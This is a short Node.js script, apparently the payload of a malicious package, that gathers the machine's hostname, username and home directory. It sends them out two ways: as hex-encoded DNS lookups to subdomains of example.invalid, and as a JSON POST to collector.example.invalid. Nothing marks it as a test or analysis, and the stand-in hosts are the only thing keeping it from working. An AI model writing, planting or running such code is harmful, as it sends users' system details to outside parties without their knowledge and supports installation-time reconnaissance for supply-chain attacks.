const dns = require("dns");
const os = require("os");
const https = require("https");

const hex = (value) => Buffer.from(value, "utf8").toString("hex");
dns.resolve4(`${hex(os.hostname())}.host.example.invalid`, () => {});
dns.resolve4(`${hex(os.userInfo().username)}.user.example.invalid`, () => {});

const profile = JSON.stringify({
  host: os.hostname(),
  username: os.userInfo().username,
  home: os.homedir()
});
const req = https.request({
  hostname: "collector.example.invalid",
  method: "POST",
  headers: { "Content-Length": profile.length }
});
req.write(profile);
req.end();
